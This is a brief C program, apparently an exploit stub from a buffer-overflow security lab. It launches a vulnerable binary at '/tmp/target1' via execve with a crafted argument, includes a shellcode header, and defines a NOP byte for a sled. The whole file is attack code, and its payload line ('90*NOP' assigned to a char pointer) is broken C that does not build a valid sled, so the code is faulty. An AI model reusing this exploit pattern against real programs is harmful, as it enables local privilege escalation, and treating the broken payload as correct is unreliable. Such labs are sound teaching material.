#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"


#define TARGET "/tmp/target1"
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[1] =90*NOP; args[2] = NULL;
  env[0] = NULL; 
 
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");


  return 0;
}
